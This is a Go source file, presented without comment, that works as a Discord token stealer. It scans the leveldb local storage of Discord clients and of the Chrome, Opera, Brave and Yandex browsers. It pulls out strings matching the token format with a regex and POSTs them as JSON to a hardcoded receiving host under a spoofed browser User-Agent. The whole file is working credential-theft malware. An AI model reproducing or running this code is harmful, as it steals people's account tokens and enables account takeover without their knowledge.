package main

import (
	"bytes"
	"encoding/json"
	"io/ioutil"
	"net/http"
	"os"
	"regexp"
	"strings"
)

var webhookURL = "http://10.6.1.65/receive"

var paths = map[string]string{
	"Discord":        os.Getenv("APPDATA") + "\\Discord",
	"Discord Canary": os.Getenv("APPDATA") + "\\discordcanary",
	"Discord PTB":    os.Getenv("APPDATA") + "\\discordptb",
	"Google Chrome":  os.Getenv("LOCALAPPDATA") + "\\Google\\Chrome\\User Data\\Default",
	"Opera":          os.Getenv("APPDATA") + "\\Opera Software\\Opera Stable",
	"Brave":          os.Getenv("LOCALAPPDATA") + "\\BraveSoftware\\Brave-Browser\\User Data\\Default",
	"Yandex":         os.Getenv("LOCALAPPDATA") + "\\Yandex\\YandexBrowser\\User Data\\Default",
}

func getHeader(tt string) map[string]string {
	headers := map[string]string{
		"Content-Type": "application/json",
		"User-Agent":   "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36",
	}

	if tt != "" {
		headers["Authorization"] = tt
	}

	return headers
}

func getvalue(path string) []string {
	var val []string
	files, err := ioutil.ReadDir(path + "\\Local Storage\\leveldb")
	if err != nil {
		return val
	}

	for _, file := range files {
		if !strings.HasSuffix(file.Name(), ".log") && !strings.HasSuffix(file.Name(), ".ldb") {
			continue
		}

		filePath := path + "\\Local Storage\\leveldb\\" + file.Name()
		data, err := ioutil.ReadFile(filePath)
		if err != nil {
			continue
		}

		lines := strings.Split(string(data), "\n")
		for _, line := range lines {
			if len(line) == 0 {
				continue
			}
			r := regexp.MustCompile(`[a-zA-Z0-9_-]{24}\.[a-zA-Z0-9_-]{6}\.[a-zA-Z0-9_-]{27}`)
			val = append(val, r.FindAllString(line, -1)...)
		}
	}

	return val
}

func main() {

	for _, path := range paths {
		if _, err := os.Stat(path); os.IsNotExist(err) {
			continue
		}
		val := getvalue(path)
		for _, _ = range val {
			webhookJSON, _ := json.Marshal(val)
			req, err := http.NewRequest("POST", webhookURL, bytes.NewBuffer(webhookJSON))
			if err != nil {
				continue
			}
			for key, value := range getHeader("") {
				req.Header.Set(key, value)
			}

			client := &http.Client{}
			_, err = client.Do(req)
			if err != nil {
				continue
			}
		}
	}

}

func contains(slice []string, item string) bool {
	for _, a := range slice {
		if a == item {
			return true
		}
	}
	return false
}
